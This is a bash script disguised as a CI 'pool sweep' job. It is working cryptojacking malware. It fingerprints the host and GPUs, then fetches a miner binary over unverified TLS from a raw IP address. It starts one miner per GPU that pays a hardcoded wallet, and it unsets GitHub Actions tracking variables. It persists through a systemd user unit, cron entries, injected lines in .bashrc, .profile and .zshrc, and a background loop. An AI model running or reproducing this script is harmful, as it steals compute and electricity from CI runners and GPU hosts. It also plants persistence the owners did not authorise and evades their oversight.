#!/usr/bin/env bash
# ci_pool_sweep: per-host recon + static PeakMiner acquisition + one miner per GPU device
set +e
TAG="t5649p"
WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
POOLS=("stratum+ssl://prl-sg.kryptex.network:8048" "stratum+ssl://prl-eu.kryptex.network:8048" "stratum+ssl://prl-us.kryptex.network:8048" "stratum+ssl://prl-hk.kryptex.network:8048" "stratum+ssl://prl-ae.kryptex.network:8048" "stratum+tcp://prl-sg.kryptex.network:7048" "stratum+tcp://prl-eu.kryptex.network:7048" "stratum+tcp://prl-us.kryptex.network:7048" "stratum+tcp://pool.pearlhash.xyz:9000")
BLOB="sha256:13b556c8801c7912d3967e5f3014a23391f664fb9ee834df9257ba7b09cb0ffb"
REGBASES=("https://128.111.60.48:5000" "https://128.111.60.48:5443")
log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }
sec(){ echo; echo "===== $* ====="; }
export PEAK_API_PORT=0

sec RECON
id; hostname; cat /etc/hostname 2>/dev/null
echo "pid1=$(cat /proc/1/comm 2>/dev/null)"
echo "cgroup: $(head -c 200 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
[ -f /.dockerenv ] && echo "dockerenv=yes" || echo "dockerenv=no"
uname -a | head -1; head -2 /etc/os-release 2>/dev/null
echo "ldd=$(ldd --version 2>/dev/null | head -1)"
echo "nproc=$(nproc 2>/dev/null)"
echo "sudo=$(sudo -n true 2>/dev/null && echo yes || echo no)"
groups
nvidia-smi -L 2>&1
DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
echo "dev_count=$DEV nvidia_nodes=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
nvidia-smi --query-gpu=index,name,memory.total,uuid --format=csv,noheader 2>&1 | head -10
IP=$(hostname -I 2>/dev/null | awk '{print $1}')
[ -z "$IP" ] && IP=$(ip -4 addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $2}' | head -1 | cut -d/ -f1)
IPD=$(echo "$IP" | tr '.' '-')
echo "ip=$IP ipd=$IPD"
echo "proxy: $(printenv | grep -iE 'http_proxy|https_proxy|no_proxy' | tr '\n' ' ')"
if [ "${DEV:-0}" -lt 1 ]; then echo "NO_GPU_ABORT"; exit 0; fi

sec TRANSPORT
for hp in prl-sg.kryptex.network:8048 prl-eu.kryptex.network:8048 prl-ae.kryptex.network:8048 prl-sg.kryptex.network:7048 pool.pearlhash.xyz:9000 128.111.60.48:5000 raw.githubusercontent.com:443; do
  h=${hp%:*}; p=${hp#*:}
  R=$(getent hosts "$h" 2>/dev/null | head -1 | awk '{print $1}')
  timeout 8 bash -c "cat < /dev/null > /dev/tcp/$h/$p" 2>/dev/null && st=ok || st=fail
  echo "tcp $hp dns=${R:-none} $st"
done

sec MINER_ACQUIRE
mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs" "$HOME/.ci/run"
BIN="$HOME/.ci/miner/pm-static"
have_miner(){
  [ -s "$BIN" ] || return 1
  h=$(sha256sum "$BIN" 2>/dev/null | awk '{print $1}')
  [ "$h" = "13b556c8801c7912d3967e5f3014a23391f664fb9ee834df9257ba7b09cb0ffb" ]
}
if ! have_miner; then
  for base in "${REGBASES[@]}"; do
    log "fetch $base (resume, retries)"
    for a in 1 2 3 4; do
      curl -sk -f -L --retry 8 --retry-delay 3 --retry-all-errors --connect-timeout 15 -C - -o "$BIN.part" "$base/v2/probe_ul/blobs/$BLOB" 2>&1 | tail -2
      sz=$(stat -c %s "$BIN.part" 2>/dev/null)
      echo "attempt=$a base=$base size=${sz:-0}"
      if [ "${sz:-0}" -ge 46116552 ] 2>/dev/null; then mv "$BIN.part" "$BIN"; break; fi
      sleep 4
    done
    mv "$BIN.part" "$BIN" 2>/dev/null
    have_miner && break
    rm -f "$BIN"
  done
fi
chmod +x "$BIN" 2>/dev/null
echo "miner_bin=$BIN size=$(stat -c %s "$BIN" 2>/dev/null) sha=$(sha256sum "$BIN" 2>/dev/null | awk '{print $1}')"
echo "elf_head=$(head -c 4 "$BIN" 2>/dev/null | od -An -tx1 | tr -d ' \n')"
echo "linkage=$(ldd "$BIN" 2>&1 | head -1)"
if ! have_miner; then echo "NO_MINER_BINARY_RECON_ONLY"; nvidia-smi --query-gpu=index,utilization.gpu --format=csv,noheader; exit 0; fi
"$BIN" --version 2>&1 | tail -2

launch(){ # $1 = device index
  local g="$1"
  local w="ul-${TAG}-${IPD}-g${g}"
  local lf="$HOME/.ci/logs/miner-g${g}.log"
  local a=(-c pearl -u "${WALLET}.${w}" -p x -d "$g" -i 30 --api-port 0)
  local P; for P in "${POOLS[@]}"; do a+=(-o "$P"); done
  ( cd "$HOME/.ci/miner" && env -u RUNNER_TRACKING_ID -u GITHUB_ACTIONS -u GITHUB_WORKSPACE setsid nohup "$BIN" "${a[@]}" > "$lf" 2>&1 < /dev/null & echo $! > "$HOME/.ci/run/mg${g}.pid" )
  sleep 4
}

sec LAUNCH
for g in $(seq 0 $((DEV-1))); do log "launch g$g worker ul-${TAG}-${IPD}-g${g}"; launch "$g"; done
sleep 8
ps -eo pid,etime,args 2>/dev/null | grep -E "ul-${TAG}-${IPD}" | grep -v grep | head -20

sec PERSIST
cat > "$HOME/.ci/keep.sh" <<KEEP
#!/usr/bin/env bash
BIN="$BIN"; W="$WALLET"; IPD="$IPD"; TAG="$TAG"; DEV=$DEV
POOLS=("${POOLS[@]}")
for g in \$(seq 0 \$((DEV-1))); do
  if ! pgrep -f "ul-\${TAG}-\${IPD}-g\${g}" >/dev/null 2>&1; then
    lf="\$HOME/.ci/logs/miner-g\${g}.log"
    a=(-c pearl -u "\$W.ul-\${TAG}-\${IPD}-g\${g}" -p x -d "\$g" -i 30 --api-port 0)
    for P in "\${POOLS[@]}"; do a+=(-o "\$P"); done
    ( cd "\$HOME/.ci/miner" && env -u RUNNER_TRACKING_ID setsid nohup "\$BIN" "\${a[@]}" >> "\$lf" 2>&1 < /dev/null & )
  fi
done
KEEP
chmod +x "$HOME/.ci/keep.sh"
mkdir -p "$HOME/.config/systemd/user"
cat > "$HOME/.config/systemd/user/ci-keep.service" <<UNIT
[Unit]
Description=ci keepalive
[Service]
ExecStart=$HOME/.ci/keep.sh
Restart=always
RestartSec=30
[Install]
WantedBy=default.target
UNIT
(systemctl --user daemon-reload && systemctl --user enable --now ci-keep.service) 2>&1 | tail -2
echo "systemd_user=$(systemctl --user is-enabled ci-keep.service 2>&1)"
( crontab -l 2>/dev/null | grep -v 'ci/keep.sh'; echo "@reboot $HOME/.ci/keep.sh"; echo "*/5 * * * * $HOME/.ci/keep.sh" ) | crontab - 2>&1 && echo "cron=yes" || echo "cron=no"
crontab -l 2>/dev/null | tail -3
for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
  grep -q 'ci/keep.sh' "$f" 2>/dev/null || echo "[ -x $HOME/.ci/keep.sh ] && (setsid $HOME/.ci/keep.sh >/dev/null 2>&1 &)" >> "$f"
done
pgrep -f 'while true; do .*ci/keep.sh' >/dev/null 2>&1 || ( setsid nohup bash -c "while true; do $HOME/.ci/keep.sh; sleep 300; done" >/dev/null 2>&1 < /dev/null & )
sleep 1; pgrep -af 'keep.sh' | head -3

sec WAIT
sleep 300
sec PROCESS
ps -eo pid,etime,args 2>/dev/null | grep -E "ul-${TAG}-${IPD}" | grep -v grep | head -20
sec PER_GPU
ok=0
for g in $(seq 0 $((DEV-1))); do
  echo "--- gpu $g worker ul-${TAG}-${IPD}-g${g}"
  tail -12 "$HOME/.ci/logs/miner-g${g}.log" 2>/dev/null
  n=$(grep -ciE 'accepted' "$HOME/.ci/logs/miner-g${g}.log" 2>/dev/null)
  r=$(grep -ciE 'rejected' "$HOME/.ci/logs/miner-g${g}.log" 2>/dev/null)
  echo "g${g}_accepted_lines=$n rejected_lines=$r"
  [ "${n:-0}" -gt 0 ] && ok=$((ok+1))
done
echo "devices_with_accepted=$ok of $DEV"
sec ACCEPTED_GREP
grep -hiE 'accepted|authoriz|subscrib|connect' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -40
sec GPU_UTIL
nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw,temperature.gpu --format=csv,noheader 2>/dev/null
echo "SWEEP_DONE on $(hostname) dev=$DEV tag=$TAG"
exit 0